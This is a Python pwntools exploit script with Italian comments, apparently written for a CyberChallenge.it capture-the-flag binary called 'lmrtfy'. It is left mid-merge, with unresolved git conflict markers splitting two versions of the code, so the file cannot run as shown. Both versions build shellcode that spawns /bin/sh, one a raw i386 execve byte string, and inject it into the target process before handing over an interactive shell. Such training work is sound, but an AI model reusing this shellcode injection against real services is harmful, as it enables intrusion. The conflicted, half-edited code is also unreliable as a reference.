#!/usr/bin/env python3

# Importa la libreria di pwntools
from pwn import *


def main():
    '''
    remote(hostname, port) apre una socket e ritorna un object
    che può essere usato per inviare e ricevere dati sulla socket  
    '''
<<<<<<< HEAD
    HOST = "lmrtfy.challs.cyberchallenge.it"
    PORT = 9124
=======
    HOST = "shell.challs.cyberchallenge.it"
    PORT = 9123
>>>>>>> 9c1958c61d4db1a0024c50cd12e424d8b8a8ea85
    #r = remote(HOST, PORT)
    exe = ELF("./lmrtfy")
    context.binary = exe
    r = process(exe.path)


    # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
    #r.send(b"Ciao!")

    # .sendline() è identico a .send(), però appende un newline dopo i dati
    #r.sendline(b"Ciao!")

    # .sendafter() e .sendlineafter() inviano la stringa "Ciao!"
    #r.sendafter(b"... Invia un qualsiasi carattere per iniziare ...", b"k")


    # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"

<<<<<<< HEAD
    #return_address = p32(0x08048593, endianness='little') #gadget address
    #string = "a" * 44 #40 buff bytes + 4 frame pointer bytes
    #string_bytes = str.encode(string)
    payload = asm(shellcraft.sh())

    print(type(payload))
    print(payload)

    data = r.recv(1024);
=======

    payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xe9\x08\x04\x94\x44" # address = 08049444

    context.endian = 'little'
    context.arch = 'i386'
    context.word_size = 32

    payload = asm(shellcraft.sh())
    print(payload)
    payload = payload[:42]
    address_location = p32(0xf7fc0030, endianness = 'little')
    address = p32(0x08049444, endianness = 'little')
    payload = payload + b'\xc3' # b'\xff\x25' + address_location + address
    print(payload)

    r.recvline();
>>>>>>> 9c1958c61d4db1a0024c50cd12e424d8b8a8ea85
    r.sendline(payload)

    data = r.recv(1024)
    print(data)

    data = r.recv(1024)
    print(data)

    # permette di interagire con la connessione direttamente dalla shell
    r.interactive()

    # chiude la socket
    r.close()


if __name__ == "__main__":
    main()
